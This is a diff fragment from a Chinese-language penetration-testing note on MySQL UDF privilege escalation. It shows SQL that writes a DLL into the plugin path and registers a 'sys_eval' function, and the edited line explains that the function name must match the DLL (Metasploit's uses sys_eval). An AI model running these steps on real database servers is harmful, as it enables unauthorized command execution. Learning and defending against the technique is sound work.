@@ -31,7 +31,7 @@
         ```sql
         select * from foo into dumpfile "/path/to/udf/path/udf.dll";
         ```
-    - 创建自定义函数
+    - 创建自定义函数, 这里函数名必须是 dll 文件中定义好的函数, 可以使用 hexeditor 查看, msf 内置的 dll, 使用的是 `sys_eval`
         ```sql
         create function sys_eval returns string soname 'udf.dll';
         ```
